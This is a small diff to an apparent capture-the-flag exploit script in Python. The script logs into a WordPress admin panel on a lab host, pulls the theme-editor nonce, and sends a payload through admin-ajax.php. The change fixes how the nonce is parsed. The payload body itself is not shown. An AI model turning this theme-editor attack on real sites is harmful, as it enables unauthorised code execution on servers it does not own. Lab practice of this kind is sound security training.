@@ -29,6 +29,6 @@ print(login)
 
 print("* Fetching theme-editor nonce")
 theme_editor = requests.get("http://internal.thm/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen", cookies=login.cookies)
-nonce = find_nonce.search(theme_editor.text)
+nonce = find_nonce.search(theme_editor.text)[1]
 print("* Poof")
 theme_editor = requests.get("http://internal.thm/blog/wp-admin/admin-ajax.php", payload(nonce),cookies=login.cookies)
